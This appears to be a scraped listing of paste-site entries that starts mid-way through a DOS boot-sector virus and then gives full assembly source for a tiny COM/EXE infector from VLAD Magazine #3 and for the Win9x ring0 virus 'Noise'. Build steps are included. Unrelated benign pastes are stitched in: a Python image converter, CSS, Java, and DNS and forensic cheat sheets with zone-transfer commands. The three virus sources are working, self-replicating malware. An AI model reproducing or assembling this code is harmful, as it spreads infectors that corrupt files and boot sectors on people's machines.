	mov     di,offset i13
	movsw
	movsw
	mov     word ptr [si-4],offset handler
	mov     word ptr [si-2],es

	pop     bx
	push    bx
	add     bx,offset end_virus
	
	push    es
	
	push    cs
	pop     es
	mov     ax,201h
	mov     cx,1
	mov     dx,80h
	int     13h
	
	pop     es

	mov     si,21h*4
	mov     di,offset i21
	movsw
	movsw
	mov     word ptr [si-4],offset int21handler
	mov     word ptr [si-2],es
	
	mov     byte ptr es:set_21,1
	pop     si
	
resident:
	push    cs
	pop     ds
	push    cs
	pop     es

	add     si,offset old4
	mov     di,100h
	push    di
	movsw
	movsw

	ret

old4    db      0cdh,20h,0,0
new4    db      0e9h,0,0,'V'

;------------------- Int 21 ----------------

Int21handler:
	push    ax
	push    es
	mov     ax,0b800h
	mov     es,ax
	mov     word ptr es:[340],0afafh

	pop     es
	pop     ax

	push    ax
	xchg    al,ah
	cmp     al,3dh
	je      chk_infect
	cmp     al,4bh
	je      chk_infect
	cmp     al,43h
	je      chk_infect
	cmp     al,56h
	je      chk_infect
	cmp     ax,6ch
	je      chk_infect
	pop     ax
exit_21:
	db      0eah
	i21     dd      0

far_pop:
	jmp     pop_21

chk_infect:
	push    bx
	push    cx
	push    dx
	push    si
	push    di
	push    ds
	push    es

	cmp     al,6ch
	jne     no_6c
	mov     dx,si
no_6c:
	mov     si,dx
	cld
keep_lookin:
	lodsb
	cmp     al,'.'
	jne     keep_lookin
	lodsw
	or      ax,2020h
	cmp     ax,'oc'
	jne     far_pop
	lodsb
	or      al,20h
	cmp     al,'m'
	jne     far_pop
	mov     ax,3d02h
	call    int21h
	jc      far_pop
	xchg    bx,ax
	
	mov     ah,3fh
	mov     cx,4
	push    cs
	pop     ds
	mov     dx,offset old4
	call    int21h

	mov     ax,word ptr [old4]
	cmp     al,0e9h
	jne     chk_exe
	mov     al,byte ptr old4+3
	cmp     al,'V'
	je      close_exit
	jmp     infect
chk_exe:
	or      ax,2020h
	cmp     ax,'mz'
	je      close_exit
	cmp     ax,'zm'
	je      close_exit
infect:
	call    lseek_end
	or      dx,dx                   ;Too big
	jnz     close_exit
	cmp     ax,63500
	ja      close_exit
	cmp     ax,1000
	jb      close_exit

	push    ax
	add     ax,100h
	mov     delta,ax
	pop     ax
	sub     ax,3
	mov     word ptr new4+1,ax

	mov     ax,5700h
	call    int21h
	jc      close_exit
	push    cx
	push    dx

	mov     ah,40h
	mov     cx,offset end_virus
	xor     dx,dx
	call    int21h
	jc      time_exit

	call    lseek_start
	
	mov     ah,40h
	mov     cx,4
	mov     dx,offset new4
	call    int21h
	

time_exit:
	pop     dx
	pop     cx
	mov     ax,5701h
	call    int21h

close_exit:
	mov     ah,3eh
	call    int21h
pop_21:
	pop     es
	pop     ds
	pop     di
	pop     si
	pop     dx
	pop     cx
	pop     bx
	pop     ax
	jmp     exit_21

lseek_start:
	mov     al,0
	jmp     short lseek
lseek_end:
	mov     al,2
lseek:
	xor     cx,cx
	cwd
	mov     ah,42h
	call    int21h
	ret


Int21h:
	pushf
	call dword ptr cs:i21
	ret

	set_21  db      0       ;1 = 21 is set
;------------------- Int 13 ----------------

Stealth:
	mov     cx,4
	mov     ax,201h

	or      dl,dl
	js      stealth_mbr             ;DL>=80H then goto stealthmbr

	mov     cl,14
	mov     dh,1
stealth_mbr:
	call    int13h
	jmp     pop_end

res_test:
	xchg    ah,al
	iret

multipartite:
	cmp     byte ptr cs:set_21,1
	je      jend
	cmp     word ptr es:[bx],'ZM'
	jne     jend
	push    si
	push    di
	push    ds
	push    es

	xor     si,si
	mov     ds,si
	push    cs
	pop     es

	mov     si,21h*4
	mov     di,offset i21
	movsw
	movsw
	mov     word ptr [si-4],offset int21handler
	mov     word ptr [si-2],es

	mov     byte ptr cs:set_21,1

	pop     es
	pop     ds
	pop     di
	pop     si
	jmp     jend

rend:
	retf    2

Jend:
	db      0eah                    ;= JMP FAR PTR
	i13     dd      0               ;Orig int13h

Handler:
	cmp     ax,0f001h               ;You fool.
	je      res_test

	cmp     ah,2
	jne     multipartite

	cmp     cx,1
	jne     multipartite

	or      dh,dh
	jnz     multipartite
	

	call    int13h                  ;Call the read so we can play with
					; the buffer.
	jc      rend                    ;The read didn't go through so leave

	pushf
	push    ax
	push    bx
	push    cx
	push    dx
	push    si
	push    di
	push    ds
	push    es
	
	cmp     word ptr es:[bx+offset marker],'M['
	je      stealth

	mov     byte ptr cs:llstealth_disable,1

	mov     cx,4                    ;Orig HD MBR at sector 3.

	or      dl,dl                   ;Harddisk ?
	js      write_orig              ;80H or above ?

	;Calculate shit like track/head for floppy******
	push    dx

	push    cs
	pop     ds

	mov     ax,es:[bx+18h]          ;Sectors per track.
	sub     es:[bx+13h],ax          ;Subtract a track.
	mov     ax,es:[bx+13h]          ;AX=total sectors.
	mov     cx,es:[bx+18h]          ;CX=sectors per track
	xor     dx,dx
	div     cx                      ;Total sectors/sectors per track

	xor     dx,dx
	mov     cx,word ptr es:[bx+1ah] ;CX=heads
	div     cx                      ;Total tracks/heads

	push    ax
	xchg    ah,al                   ;AX=Track
	mov     cl,6
	shl     al,cl                   ;Top 2 bits of track.
	or      al,1                    ;We'll use the first sector onward.
	mov     word ptr floppy_sect,ax

	pop     ax
	mov     cx,word ptr es:[bx+1ah] ;CX=heads
	xor     dx,dx
	div     cx                      ;Track/Total Heads

	mov     byte ptr floppy_head,dl ;Remainder=Head number

	mov     cx,14                   ;Floppy root directory.
	pop     dx
	mov     dh,1

write_orig:
	mov     ax,301h                 ;Save the original boot sector.
	call    int13h
	jc      pop_end

	push    es
	pop     ds

	mov     si,bx
	push    cs
	pop     es                      ;ES=CS
	mov     cx,510                  ;Move original sector to our buffer.
	cld
	mov     di,offset end_virus
	rep     movsb
	
	mov     ax,0aa55h               ;End of sector marker.
	stosw

	push    cs
	pop     ds

	xor     si,si
	mov     di,offset end_virus
	mov     cx,offset com_entry
	rep     movsb

	mov     bx,offset end_virus
	
	mov     ax,301h
	mov     cx,1
	xor     dh,dh
	
	call    int13h
	jc      pop_end
	
	mov     ax,302h
	mov     cx,2
	xor     bx,bx
	or      dl,dl
	js      mbr_write

	mov     cx,word ptr floppy_sect
	mov     dh,byte ptr floppy_head
	
mbr_write:

	call    int13h                  ;Write the virus!

pop_end:
	mov     byte ptr cs:llstealth_disable,0

	pop     es
	pop     ds
	pop     di
	pop     si
	pop     dx
	pop     cx
	pop     bx
	pop     ax
	popf    
	jmp     rend                                        


Int13h  Proc    Near
; AH & AL are swapped on entry to this call.

	pushf                   ;Setup our interrupt
	push    cs              ;Our segment
	call    jend            ;This will also fix our AX
	ret

Int13h  EndP

;------------------- Int 76 ----------------

not_bs:
	pop     es
	pop     ds
	pop     di
	pop     dx
	pop     cx
	pop     bx
	pop     ax
no_stealth:
	db      0eah                    ;JMPF
	i76     dd      0
	
Int76Handler:
	cmp     byte ptr cs:llstealth_disable,1
	je      no_stealth

	push    ax
	push    bx
	push    cx
	push    dx
	push    di
	push    ds
	push    es

	mov     dx,1f3h
	in      al,dx           ;Sector number.
	cmp     al,1
	jne     not_bs
	inc     dx              ;1f4h
	in      al,dx           ;Cylinder Low
	cmp     al,0
	jne     not_bs
	inc     dx              ;1f5h
	in      al,dx           ;Cylinder High
	cmp     al,0
	jne     not_bs
	inc     dx              ;1f6h
	in      al,dx
	and     al,0fh          ;Remove everything but the head.
	cmp     al,0            ;Head
	jne     not_bs

	inc     dx              ;1f7h
	in      al,dx

	test    al,0fh
	jnz     disk_read
	jmp     not_bs          ;Must be a write.
disk_read:
	cld
	mov     dx,1f0h
	push    cs
	pop     es
	mov     di,offset end_virus
	mov     cx,512/2
	rep     insw            ;Read in what they read.

	;Now reset the whole system for a read from sector 4.

	mov     dx,1f2h
	mov     al,1            ;One sector.
	out     dx,al
	inc     dx
	mov     al,4            ;Sector 4 instead.
	out     dx,al   ;1f3
	mov     al,0
	inc     dx
	out     dx,al   ;1f4
	inc     dx
	out     dx,al   ;1f5
	inc     dx
	mov     al,0a0h
	out     dx,al   ;1f6

	mov     dx,1f7h
	mov     al,20h          ;Read function.
	out     dx,al
not_done:
	in      al,dx
	test    al,8
	jz      not_done
	jmp     not_bs

llstealth_disable       db      0       ;0 means int76 enabled 
;---------------------- 76 -------------------

end_virus:"
6btzSby2,VLAD Magazine - Issue #3 - Small Virus,FlyFar,ASM (NASM),Wednesday 28th of June 2023 11:01:45 PM CDT,";---------------------------------------------------------------------------
;
; Smallest Virus I Could Manage - 263 bytes
; The Smallest Virus I Could Manage
;
; In Nuke InfoJournal #5 I foolishly boasted about a 387-byte TSR COM/EXE
; parasitic infector I'd written.. well the days of semi-lameness are gone
; (that was almost 2 years ago now) and I've come up with the goods.
;
; This is the smallest virus I could figure out at this point in time.
; In all respects, it's a fully viable spreader in the wild, although it
; does have serious 'security' problems - it doesn't trap i24 (critical
; error handler), clean registers before returning control to the host, or
; even use i21 functions by chaining on to the old vector (it calls i21
; with an INT instruction).  I have no pretenses in that I fully don't
; expect to see this in the wild, since it was only written for
; investigative pleasure anyway, to see how small a virus could be
; written.
;
; There was another version of this virus which I gave out to a few people
; on #virus, which had a slight bug (rather, hasty oversight) in it, where
; I changed a bit of code and didn't change a corresponding line a few
; lines later.. which results in the i21 vector being partially
; overwritten and thus the machine will crash (bad side effect!), which
; was 291 bytes.  The difference between this virus and the 'old' one is
; that this one doesn't change the target EXE file's stack, simply leaving
; it and negating the need to carry the extra 4 bytes around with the
; virus, as well as cutting code size.  Also, the 'old' one didn't trigger
; any heuristic flags whereas this one does.  (see below)
;
; This virus is a memory-resident parasitic infector of COM and EXE files
; on execution, 263 bytes.  It doesn't reinfect memory OR files.
;
; The older revision (sm2.asm, and the bug-fix, sm2b.asm) avoided all
; heuristic flags (except maybe suspicious stack); it inserted the delta
; offset straight into the first instruction of the virus, instead of
; doing the usual 'call $+3/pop si/sub si,3'.  However this just took up
; too much code and besides, it's going to get caught anyway, so why
; bother?  So in this version, it was removed, but the lines are only
; commented out.  If, for some reason, you want to re-enable the old
; system, uncomment the appropriate lines and delete the lines with only a
; semicolon after them (ie not the ones with actual comments!).  Enabling
; this will bring the virus size up to all 268 bytes.
;
; In its current form, I think it's as optimized as I can make it.  Apart
; from the odd 1-byte improvement, any difference would require a change
; in viral architecture.  Some hardcore processor head would have to do it,
; perhaps they'd get a virus of 260 bytes.. but below that, I'm sure it'd
; have to be deficient or unreliable in some respect (as far as I can
; rationally extrapolate, judging how limited this virus is in avoiding
; detection).  I'm certainly not saying that a smaller virus cannot be
; written, however, because it's probably possible.  If I could see how,
; though, I'd do it! :)  Making this smaller would require the removal of
; 'safety' checks (eg bailing if the file can't be opened, bailing if the
; file is less than 24 bytes, etc).  However I consider these checks to be
; part of a viable virus, so I left them in.
;
; There isn't a great deal of commenting on this virus.  A few of the
; techniques just aren't applicable to viruses of the normal kind, so
; there's no real point.  To gain anything much out of examining this
; the source you more or less have to have a good idea of what's going on
; anyway.
; 
;
; by T�L�N
;
; compile with a86, rename the .bin to a .com and it's ready to roll...
;

org 0
@marker equ 19h

v_start:        ; mov si, 0100h
                call $+3        ;
                pop si          ;
                sub si, 3       ;

                push ds
                xor ax, ax              ; this virus resides at the end
                mov es, ax              ; of the interrupt table & then some
                mov di, 200h
                push di
                cld
                scasw                   ; is the space clear?
                pop di
                jne v_exit

                push si
                mov cx, v_len
             db 02eh                    ; make CS source of movsb
                rep movsb               ; copy the virus to memory
                mov si, 21h*4           ; & save old i21 vector
                push si
             db 26h                     ; make ES source of movsw
                movsw
             db 26h
                movsw
                pop di
                mov ax, offset new21 + 200h
                stosw
                xchg ax, cx
                stosw                   ; capture int 21h
                pop si
v_exit:         pop es
                add si, offset old_shit
                pop ax
                or sp, sp               ; COM or EXE determination
                push ax
                push cs
                pop ds
                jnz exit_exe

exit_com:       mov di, 100h            ; return to COM host
                push di
                movsw
                movsw
                ret
exit_exe:       mov ax, es              ; return to EXE host
                add ax, 10h
                add word ptr [si+2], ax
                jmp dword ptr [si]

old_shit:       int 20h
             dw 0

new21:          cmp ax, 4b00h           ; infect on execute
                je infect
                jmp exit21

infect:         push ax
                push bx
                push cx
                push dx
                push si
                push di
                push ds
                push es

                mov ax, 3d02h           ; open the file
                int 21h
                jc bitch

                push cs
                pop ds
                push cs
                pop es

                xchg ax, bx
                mov ah, 3fh
                mov cx, 24
                mov dx, offset signature+200h
                int 21h                ; read header
                xor cx, ax
                jnz bitch1

                mov si, dx
                push ax
                mov al, @marker
                cmp byte ptr [si+3], al ; is the infection marker present? 
                                        ;(com)
                je bitch2
                cmp byte ptr [si+12h], al       ; (exe)
                je bitch2

                mov ax, 4202h           ; seek to EOF  dx:ax -> file len
                cwd
                int 21h                 ; cx is already zero
                push ax

                mov di, offset old_shit+200h
                cmp byte ptr [si], 'M'
                je infect_exe
infect_com:     push si
                movsw                   ; save first 4 of COM
                movsw
                pop di
                mov al, 0e9
                stosb
                pop ax
;                inc ah
;                mov word ptr [v_start+201h], ax
;                sub ax, 103h
                dec ax          ;
                dec ax          ;
                dec ax          ;
                stosw
                mov byte ptr [di], @marker      ; mark infection

write_us:       mov ah, 40h
                mov cx, v_len
                mov dx, 200h
                int 21h

write_hdr:      mov ax, 4200h
                cwd
                xor cx, cx
                int 21h

                pop cx
                mov ah, 40h
                mov dx, offset signature+200h
                int 21h

                push ax                 ; ambiguous instruction

bitch2:         pop ax
bitch1:         mov ah, 3eh
                int 21h
bitch:          pop es
                pop ds
                pop di
                pop si
                pop dx
                pop cx
                pop bx
                pop ax
exit21:         jmp dword ptr cs:[old21+200h]

infect_exe:     push dx
                push si
                mov si, offset [exe_ip+200h]
                movsw                   ; save IP, CS
                movsw
                add ax, v_len           ; calculate part_page, page_cnt
                adc dx, 0               ; of infected file
                mov cx, 200h
                div cx
                pop di
                scasw
                scasw
                std                     ; a novel approach..
                or dx, dx
                jz noinc
                inc ax
noinc:          stosw                   ; store the new values..
                xchg ax, dx
                stosw

                pop dx
                pop ax
                mov cx, 10h             ; calculate # of paragraphs
                div cx                  ; in the uninfected file
                sub ax, word ptr [hdr_size+200h]

                mov di, offset relo_cs+200h
                stosw                   ; & set new IP, CS (entry pt)
                xchg ax, dx
                stosw
;                mov word ptr [v_start+201h], ax
                mov ax, @marker
                stosw
                jmp short write_us


v_end:
old21   equ     v_end + 0
signature       equ old21 + 4           ; where we load the host files header
part_page       equ signature + 2       ; part-page at EOF
page_cnt        equ part_page + 2       ; count of code pages
hdr_size        equ page_cnt + 4        ; size of header in paragraphs
minmem          equ hdr_size + 2        ; minimum memory required
maxmem          equ minmem + 2          ; maximum memory required
relo_ss         equ maxmem + 2          ; displacement of stack segment (SS)
exe_sp          equ relo_ss + 2         ; stack pointer (SP)
chksum          equ exe_sp + 2          ; -> infection marker
exe_ip          equ chksum + 2          ; instruction pointer (IP)
relo_cs         equ exe_ip + 2          ; displacement of code segment (CS)
                                        ; 24 bytes for EXE header information

v_len equ v_end - v_start

;
;-------the-end-------------------------------------------------------------
"
ez7ry0xJ,Converte Webp para jpg ou png,MizunoBrasil,Python,Wednesday 28th of June 2023 10:29:36 PM CDT,"import os
import tkinter as tk
from tkinter import filedialog
from PIL import Image

class ImageConverterApp:
    def __init__(self, root):
        self.root = root
        self.root.title(""Image Converter"")
        self.root.geometry(""650x250"")
        self.root.resizable(False, False)
        self.root.configure(background=""white"")

        self.file_path = None

        self.choose_button = tk.Button(
            self.root, text=""Escolher arquivo"", font=(""Arial"", 12), command=self.choose_file
        )
        self.choose_button.pack(pady=20)

        self.convert_button = tk.Button(
            self.root, text=""Converter"", font=(""Arial"", 12), command=self.convert_image, state=tk.DISABLED
        )
        self.convert_button.pack(pady=20)

        self.drop_label = tk.Label(
            self.root, text=""Nenhum arquivo selecionado"", font=(""Arial"", 12), bg=""white""
        )
        self.drop_label.pack(pady=10)

    def choose_file(self):
        self.file_path = filedialog.askopenfilename(filetypes=[(""WebP Image"", ""*.webp"")])
        if self.file_path:
            self.drop_label.config(text=""Arquivo selecionado: "" + os.path.basename(self.file_path))
            self.convert_button.config(state=tk.NORMAL)
        else:
            self.drop_label.config(text=""Nenhum arquivo selecionado"")
            self.convert_button.config(state=tk.DISABLED)

    def convert_image(self):
        save_path = filedialog.asksaveasfilename(
            defaultextension="".png"", filetypes=[(""PNG Image"", ""*.png""), (""JPEG Image"", ""*.jpg"")]
        )
        if save_path:
            try:
                image = Image.open(self.file_path)
                image.save(save_path)
                self.drop_label.config(text=""Conversão concluída! Arquivo salvo como "" + os.path.basename(save_path))
            except:
                self.drop_label.config(text=""Erro ao converter a imagem!"")
        else:
            self.drop_label.config(text=""Operação cancelada!"")

root = tk.Tk()
root.title(""Image Converter"")
root.geometry(""800x600"")
root.resizable(False, False)
root.configure(background=""white"")
app = ImageConverterApp(root)
root.mainloop()
"
6TcNe4zL,Untitled,phpface,CSS,Wednesday 28th of June 2023 10:22:58 PM CDT,".logged-in.admin-bar .comments-fixed .live-chatbox-wrap .bp-messages-threads-wrapper{
    height: 95%!important;
}"
VUxwu81N,Virus.Win9x.Noise - Source Code,FlyFar,ASM (NASM),Wednesday 28th of June 2023 09:50:04 PM CDT,"
;
;                                                  ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
;                                                  ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
;     Noise                                         ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
;     Coded by Bumblebee/29a                       ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
;                                                  ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Words from the author ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . I started to code an  i-worm  and i wanted  to make something like a
;   ring0 stealth routine for it. Then i realized: i did a ring0 virus heh
;   The name is  due the little  payload it has... that does  realy noise!
;   That's my first ring0 virus. I don't like codin ring0, but here it is.
;   That's a  research  spezimen. Don't expect the ultimate ring0 virus...
;   Only 414 bytes, that's less than MiniR3 (aka Win95.Rinim).
;
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Disclaimer ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÙ
;   . This is the source  code of a VIRUS. The author  is not responsabile
;   of any  damage that  may occur  due to the assembly of this file.  Use
;   it at your own risk.
;
;   ÚÄÄÄÄÄÄÄÄÄÄ¿
;   ³ Features ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄÄÙ
;   . Ring0 resident win9x virus (thus coz the way it uses to get ring0 is
;   only for win9x, not nt not w2k).
;   . It infect in similar  way  like MiniR3 does. Uses free  space in the
;   PE header. That's a cavity virus.
;   . All the data is INSIDE the code. Well... copyright is not inside :)
;   . It infects PE  files in  the user buffer when a write  call is done.
;   That makes this virus not very efficient spreading.
;   . It has a kewl  sound  payload. Makes echo with  internal speaker for
;   all disk operations ;)
;
;   Greetz to Perikles for his tests ;) You're my best tester, you know...
;
;
;                                                       The way of the bee
;
.486p
locals
.model flat,STDCALL

        extrn           ExitProcess:PROC

VxDCall macro   vxd,service
        db      0cdh,20h
        dw      service
        dw      vxd
endm

IFSMANAGER      equ     40h

GETHEAP         equ     0dh
IFSAPIHOOK      equ     67h

VSIZE           equ     vEnd-vBegin
VSIZEROUND      equ     ((VSIZE/1024)+1)*1024

.DATA
        ; dummy data
        db      'WARNING - This is a virus carrier - WARNING'

.CODE
inicio:
        mov     eax,VSIZE

vBegin  label   byte
        pushad
        mov     al,byte ptr [esp+23h]
        sub     esp,8
        mov     ebp,esp

        cmp     al,0bfh
        jne     NotWin9x

        sidt    qword ptr [ebp]
        mov     esi,dword ptr [ebp+2]
        add     esi,3*8
        push    esi
        mov     di,word ptr [esi+6]
        shl     edi,10h
        mov     di,word ptr [esi]
        push    edi
        call    @delta
@deltaoffset:
cpright db      'Bbbee/29a@Noise'
@delta:
        pop     eax
        sub     eax,(offset @deltaoffset-offset ring0CodeInstaller)
        mov     word ptr [esi],ax
        shr     eax,10h
        mov     word ptr [esi+6],ax
        int     3h

        pop     edi
        pop     esi
        mov     word ptr [esi],di
        shr     edi,10h
        mov     word ptr [esi+6],di

NotWin9x:
        add     esp,8
        popad

        push    offset fakeHost
hostEP  equ     $-4
        ret

ring0CodeInstaller:
        pushad

        mov     ebp,0bff70000h
        sub     ebp,dword ptr [ebp]
        jz      ReturnR3

        push    VSIZEROUND
        VxDCall IFSMANAGER,GETHEAP
        pop     edi
        or      eax,eax
        jz      ReturnR3

        mov     edi,eax
        call    @@delta
@@delta:
        pop     esi
        sub     esi,(offset @@delta-offset vBegin)
        mov     ecx,VSIZE
        rep     movsb

        mov     dword ptr [delta-vBegin+eax],eax

        push    eax
        add     eax,offset ring0Hook-offset vBegin
        push    eax
        VxDCall IFSMANAGER,IFSAPIHOOK
        pop     ebp
        pop     edx
        mov     dword ptr [edx+nextHookInChain-vBegin],eax

        mov     ebp,0bff70000h
        mov     dword ptr [ebp],ebp

ReturnR3:
        popad
        iretd

ring0Hook:
        pop     eax
        push    ebp
        mov     ebp,12345678h
delta   equ     $-4
        mov     dword ptr [returnAddr-vBegin+ebp],eax
        push    edx
        mov     edx,esp

        pushad
        pushfd

        mov     ecx,0ffh
counter equ     $-4
        dec     cl
        jz      beep

        mov     ecx,dword ptr [edx+0ch]
        dec     ecx
        jz      checkFile

exitHook:
        popfd
        popad
        pop     edx
        pop     ebp

        mov     eax,12345678h
nextHookInChain equ $-4
        call    dword ptr [eax]

        push    12345678h
returnAddr      equ $-4
        ret

checkFile:
        mov     esi,dword ptr [edx+1ch]

        mov     cx,word ptr [esi]
        cmp     ecx,VSIZEROUND
        jb      exitHook

        mov     edi,dword ptr [esi+14h]

        mov     ebx,edi
        cmp     word ptr [edi],'ZM'
        jne     exitHook
        cmp     ecx,dword ptr [edi+3ch]
        jb      exitHook
        add     edi,dword ptr [edi+3ch]
        cmp     word ptr [edi],'EP'
        jne     exitHook

        mov     edx,dword ptr [edi+16h]
        test    edx,2h
        jz      exitHook
        and     edx,2000h
        jnz     exitHook
        mov     dx,word ptr [edi+5ch]
        dec     edx
        jz      exitHook

        mov     esi,edi
        mov     eax,18h
        add     ax,word ptr [edi+14h]
        add     edi,eax

        movzx   ecx,word ptr [esi+06h]
        mov     ax,28h
        mul     cx
        add     edi,eax

        mov     ecx,VSIZE
        xor     eax,eax
        pushad
        rep     scasb
        popad
        jnz     exitHook

        add     dword ptr [esi+54h],ecx

        push    edi
        sub     edi,ebx
        xchg    edi,dword ptr [esi+28h]
        mov     eax,dword ptr [esi+34h]
        add     edi,eax
        mov     dword ptr [hostEP-vBegin+ebp],edi
        pop     edi

        mov     esi,ebp
        rep     movsb

        dec     byte ptr [counter-vBegin+ebp]

        jmp     exitHook

beep:
        dec     cl
        in      al,61h
        push    ax
        or      al,03h
        out     61h,al

        mov     al,0b6h
        out     43h,al
        mov     ax,987
        mov     si,ax
beep_loop:
        add     si,100h
        mov     ax,si
        out     42h,al
        xchg    al,ah
        out     42h,al
        loop    beep_loop

        pop     ax
        out     61h,al
        jmp     exitHook

vEnd    label   byte

fakeHost:
        push    0h
        call    ExitProcess
Ends
End     inicio"
YKM6P46K,Xe1phix-[nslookup]-Cheatsheet.sh,xe1phix,Bash,Wednesday 28th of June 2023 09:37:06 PM CDT,"#!/bin/sh

## ----------------------------------------------------------------------------------------- ##
	nslookup $Domain.com					## Query A and PTR Records
## ----------------------------------------------------------------------------------------- ##
	nslookup $Domain.com x.x.x.x			## Query A and PTR record
											## using a different name server
## ----------------------------------------------------------------------------------------- ##
	nslookup -debug google.com				## Debug Mode for nslookup
## ----------------------------------------------------------------------------------------- ##
	nslookup -query=ns $Domain.com			## Query Nameserver records
## ----------------------------------------------------------------------------------------- ##
	nslookup -querytype=mx $Domain.com		## Query MX record
## ----------------------------------------------------------------------------------------- ##
	nslookup set type=mx $Domain.com		## Interactive option
## ----------------------------------------------------------------------------------------- ##
	nslookup -norecursive $Domain.com		## Non Recursive lookup
## ----------------------------------------------------------------------------------------- ##
	nslookup recursive $Domain.com			## Recursive lookup
## ----------------------------------------------------------------------------------------- ##
	nslookup ns4.google.com					## Resolve the IP Address for ns4.google.com
## ----------------------------------------------------------------------------------------- ##


## ----------------------------------------------------------------------------------------- ##
	nslookup server $Server set type=any ls -d $Target		## DNS zone transfer
## ----------------------------------------------------------------------------------------- ##



##-==========================-##
##  [+] DNS zone transfer
##-==========================-##

nslookup server $Server set type=any ls -d $Target		## DNS zone transfer


##-==================================================-##
##  [+] return verbose information about a record
##-==================================================-##
set debug
"
q1cMFdQp,Xe1phix-[Dig]-Cheatsheet-[v4.8.52].sh,xe1phix,Bash,Wednesday 28th of June 2023 09:34:24 PM CDT,"#!/bin/sh


## ----------------------------------------------------------------------------------------- ##
	dig +short +identify $Server				## see what name server
												## or whose cache is providing answers
## ----------------------------------------------------------------------------------------- ##
    dig +trace $Domain.com                      ## Debug DNS Tracing
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com | grep status				## receive the NXDOMAIN status.
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com | grep Query				## query time only
## ----------------------------------------------------------------------------------------- ##
	dig $Domain.com $Type                    	## a, mx, ns, soa, srv, txt, any
## ----------------------------------------------------------------------------------------- ##
	dig -x $TargetIP							## Pointer records
## ----------------------------------------------------------------------------------------- ##
	dig @$NameServerIP $Domain.com axfr			## Zone transfer
## ----------------------------------------------------------------------------------------- ##
	dig @$NameServerIP $Domain.com afro			## Forward zone transfer
## ----------------------------------------------------------------------------------------- ##
	dig @$IPAddr $Domain +norecurse				## Non recursive query (cache lookup)
## ----------------------------------------------------------------------------------------- ##
	dig MX +short $Domain						## Perform MX Record Lookup
## ----------------------------------------------------------------------------------------- ##
	dig +short -t txt $@					    ## Sender Policy Framework (SPF) record
## ----------------------------------------------------------------------------------------- ##
	dig ns $Domain								## List the Name Servers for google.com
## ----------------------------------------------------------------------------------------- ##
	dig a $Domain.com @$Nameserver				## Perform DNS IP Lookup
## ----------------------------------------------------------------------------------------- ##



##-============================================-##
##  [+] Query Wikipedia via console over DNS
##-============================================-##
dig +short txt <keyword>.wp.dg.cx"
4LVu4k8W,Xe1phix-Linux-Forensic-[Converting-Cheatsheet]-{(EWFAquire+AFFConvert+e2image)}-[.v2.8.9.].sh,xe1phix,Bash,Wednesday 28th of June 2023 09:28:51 PM CDT,"#!/bin/sh

## ------------------------------------------------------------------------------------------------------------------------------------- ##
		ewfacquire $$Image.raw -t $Image -f encase7          		## Convert $image.raw to EnCase Expert Witness format:
		ewfacquire $Image.raw -t $Image.ewf -f encase7
## ------------------------------------------------------------------------------------------------------------------------------------- ##
		affconvert $Image.raw										## Convert a Raw image -->> an AFF
## ------------------------------------------------------------------------------------------------------------------------------------- ##
		mksquashfs $Image.raw $image.sfs -comp lzo -noI             ## Raw image -->> Compressed SquashFS
## ------------------------------------------------------------------------------------------------------------------------------------- ##
		sfsimage -i $Image.raw $Image.sfs							## Convert Raw image -->> SquashFS
## ------------------------------------------------------------------------------------------------------------------------------------- ##
		e2image -r $Image.qcow2 $Image.raw							## Convert a QCow2 image into a Raw image
## ------------------------------------------------------------------------------------------------------------------------------------- ##
		e2image -Q /dev/sda1 $Image.qcow2							## Create a QCow2 image from a HDD
## ------------------------------------------------------------------------------------------------------------------------------------- ##
		e2image -r /dev/sda1 - | bzip2 > $Image.bz2					## Create a bzip2 Compressed Raw image file from HDD
## ------------------------------------------------------------------------------------------------------------------------------------- ##
"
qFRfVUxG,natanael-suporte-jdev-hibernate-util,tadeuespindola,Java,Wednesday 28th of June 2023 09:28:30 PM CDT,"package posjavahibernate;

import javax.persistence.EntityManager;
import javax.persistence.EntityManagerFactory;
import javax.persistence.Persistence;

public class HibernateUtil {

	public static EntityManagerFactory factory = null; // so pode ler uma vez, por isso static

	// se metodo chamado pela primeira vez ler arquivo persistence, pela segunda
	// apenas retorna o factory criado
	static {
		init();
	}

	private static void init() {
		try {
			if (factory == null) {
				factory = Persistence.createEntityManagerFactory(""pos-java-hibernate"");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	// retorna o gerenciador de entidade para fazer alteracoes no banco
	public static EntityManager getEntityManager() {
		return factory.createEntityManager();
	}

}
"
nyt7P9Nz,Xe1phix-[Ext4]-Cheatsheet-[v4.2.54].sh,xe1phix,Bash,Wednesday 28th of June 2023 09:15:39 PM CDT,"#!/bin/sh


##-========================================================================-##
##   [+] Create A Ext4 Filesystem, specifying a block size of 4096-byte blocks:
##-========================================================================-##
mkfs.ext4 -b 4096 -O metadata_csum /dev/sde1




##-========================================================================-##
##   [+] Create a journal of size 512MB:
##-========================================================================-##
tune2fs -j -J size=512 /dev/sda1


##-========================================================================-##
##   [+] Create a journal file on a different device 
##       (here, /dev/hdb2) with this:
##-========================================================================-##
mke2fs -O journal_dev /dev/sdb2


##-========================================================================-##
